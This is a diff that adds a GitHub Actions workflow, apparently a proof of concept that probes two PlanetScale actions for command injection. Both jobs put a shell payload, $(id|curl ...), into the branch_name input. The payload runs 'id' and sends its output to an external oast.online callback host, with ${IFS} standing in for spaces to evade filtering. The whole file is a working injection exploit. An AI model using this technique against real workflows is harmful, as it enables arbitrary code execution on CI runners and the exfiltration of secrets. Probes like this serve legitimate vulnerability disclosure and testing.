@@ -1,0 +1,29 @@
+name: poc
+on:
+  push:
+  workflow_dispatch:
+
+jobs:
+  poc-branch-action:
+    runs-on: ubuntu-latest
+    steps:
+      - name: create-branch-action injection probe
+        uses: planetscale/create-branch-action@allow-duplicates
+        continue-on-error: true
+        with:
+          org_name: "poc-org"
+          database_name: "pocdb"
+          branch_name: 'x$(id|curl${IFS}-d${IFS}@-${IFS}dar9fvophf83v5htebf0opnziqr186ggf.oast.online)'
+          check_exists: "true"
+
+  poc-password-action:
+    runs-on: ubuntu-latest
+    steps:
+      - name: create-branch-password-action injection probe
+        uses: planetscale/create-branch-password-action@v3
+        continue-on-error: true
+        with:
+          org_name: "poc-org"
+          database_name: "pocdb"
+          branch_name: 'y$(id|curl${IFS}-d${IFS}@-${IFS}dar9fvophf83v5htebf0opnziqr186ggf.oast.online)'
+          name: "pocpass"
